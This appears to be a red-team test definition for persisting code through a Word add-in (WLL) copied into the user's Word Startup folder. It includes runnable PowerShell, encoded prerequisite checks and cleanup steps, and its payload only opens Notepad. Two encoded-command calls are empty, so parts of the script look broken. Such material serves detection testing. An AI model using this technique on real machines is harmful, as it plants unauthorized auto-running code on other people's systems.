- id: 17f65fde-3501-5726-9b91-693781a66bfc
  name: Soumaia ART Tests - Persistent Code Execution Via Word Add-in File (WLL)
  description: 'Creates a Word Add-in file (WLL) which runs automatically when Word is started

    The sample WLL provided launches the notepad as a proof-of-concept for persistent execution from Office.

    Successfully tested on 32-bit Office 2016. Not successful from microsoft 365 version of Office.'
  tactic: persistence
  technique:
    attack_id: T1137.006
    name: 'Office Application Startup: Add-ins'
  platforms:
    windows:
      psh:
        command: "powershell -NoProfile -EncodedCommand \nif ($LASTEXITCODE -ne 0) {\n    powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAFcAbwByAGQAIABtAGEAbgB1AGEAbABsAHkAIAB0AG8AIABtAGUAZQB0ACAAdABoAGkAcwAgAHIAZQBxAHUAaQByAGUAbQBlAG4AdAAiAAoA\n}\npowershell -NoProfile -EncodedCommand aQBmACAAKAAoAFQAZQBzAHQALQBQAGEAdABoACAAIgAuAFwAdwBvAHIAZAB3AGwAbABfAHgANgA0AC4AdwBsAGwAIgApACAALQBhAG4AZAAgACgAVABlAHMAdAAtAFAAYQB0AGgAIAAiAC4AXAB3AG8AcgBkAHcAbABsAF8AeAA4ADYALgB3AGwAbAAiACkAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=\nif ($LASTEXITCODE -ne 0) {\n    powershell -NoProfile -EncodedCommand \n}\n$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  Copy \".\\wordwll_x64.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"        \n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \".\\wordwll_x86.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\""
        cleanup: |-
          Stop-Process -Name "notepad","WinWord" -ErrorAction Ignore
          Start-Sleep 3
          Remove-Item "$env:APPDATA\Microsoft\Word\Startup\notepad.wll" -ErrorAction Ignore
        payloads:
        - Addins
        - wordwll_x64.wll
        - wordwll_x86.wll
